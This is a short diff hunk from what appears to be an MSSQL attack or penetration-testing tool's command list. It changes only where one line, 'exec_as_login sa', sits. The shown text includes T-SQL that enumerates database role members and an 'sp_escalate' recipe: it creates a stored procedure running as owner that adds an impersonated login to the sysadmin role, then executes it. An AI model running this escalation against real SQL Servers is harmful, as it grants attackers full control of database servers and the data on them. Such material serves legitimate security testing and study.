@@ -500,9 +500,9 @@ enum_users
 USE [DBname];
 SELECT b.name, c.name FROM [DBname].sys.database_role_members a JOIN [DBname].sys.database_principals b ON a.role_principal_id = b.principal_id LEFT JOIN [DBname].sys.database_principals c ON a.member_principal_id = c.principal_id;
 ## sp_escalate
-## exec_as_login sa
 CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '[imp_user]','sysadmin'
 EXEC sp_escalate
+## exec_as_login sa
 
 # Link Server list
 enum_links
